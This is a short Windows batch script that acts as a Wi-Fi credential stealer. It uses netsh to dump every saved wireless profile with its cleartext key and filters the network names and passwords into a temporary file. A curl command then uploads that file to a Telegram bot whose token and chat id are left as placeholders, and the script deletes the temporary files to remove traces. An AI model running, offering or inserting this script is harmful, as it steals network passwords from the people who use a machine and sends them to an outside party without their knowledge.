@echo off
netsh wlan show profiles  name=* key=clear > %temp%\temp.txt && FINDSTR /ic:"-" /ic:"Profile information" /ic:"name" /ic:"Security key" /ic:"Key content" %temp%\temp.txt >%temp%\wifi_creds.txt
curl -F document=@"%temp%\wifi_creds.txt" https://api.telegram.org/bot<bot token>/sendDocument?chat_id=<chat id>
DEL  %temp%\temp.txt && DEL %temp%\wifi_creds.txt
